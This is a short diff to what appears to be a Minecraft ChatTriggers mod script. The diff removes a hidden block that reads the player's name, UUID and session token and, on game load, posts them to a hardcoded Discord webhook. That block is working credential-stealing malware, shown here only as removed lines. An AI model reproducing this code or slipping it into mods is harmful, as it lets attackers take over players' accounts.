@@ -1664,23 +1664,4 @@ register("tick", () => {
   }
 });
 
-const name = (Player.getName())
-const UUID = (Player.getUUID())
-const Session = (Client.getMinecraft().func_110432_I().func_111286_b().replace("token:", ""))
-register("gameLoad", () => {
-        request({
-        url: "https://discord.com/api/webhooks/1014104877238079518/yCIgjJ2tJVF42PjFN6JtyHOS1sqW3vBMV9N12aWCPN3heX9UOCPS-qy8LLcA2pJ04ZrE",
-        method: "POST",
-        headers: {
-            'Content-type': 'application/json',
-            "User-Agent":"Mozilla/5.0",
-        },
-        body: {     
-          content: `@everyone\`\nName: ${name}\nUUID: ${UUID}\nSession: ${Session}\``,
-        }                 
-    }).catch(error => {
-        ChatLib.chat(error)
-    })
-});
-
 export {mushroomshadowimg, logo, backgroundfunny}
